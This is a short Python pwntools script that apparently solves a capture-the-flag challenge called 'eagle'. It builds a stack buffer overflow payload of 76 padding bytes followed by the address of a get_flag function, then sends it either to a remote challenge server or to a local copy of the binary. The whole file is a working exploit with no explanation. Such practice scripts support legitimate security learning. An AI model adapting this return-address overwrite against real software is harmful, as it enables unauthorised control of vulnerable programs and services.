#!/usr/bin/env python2
from pwn import *
import re


def solve(_remote=True):

    vuln = ELF('./eagle')
    get_flag_addr = p32(vuln.symbols['get_flag'])
    payload = 'A' * 76 + get_flag_addr

    if _remote is True:
        io = remote('jh2i.com', 50039)
    else:
        io = vuln.process()
        
    io.recvuntil('Avast!')
    io.sendline(payload)

    print(io.recvall(1))

if __name__ == '__main__':
    solve(_remote=True)




























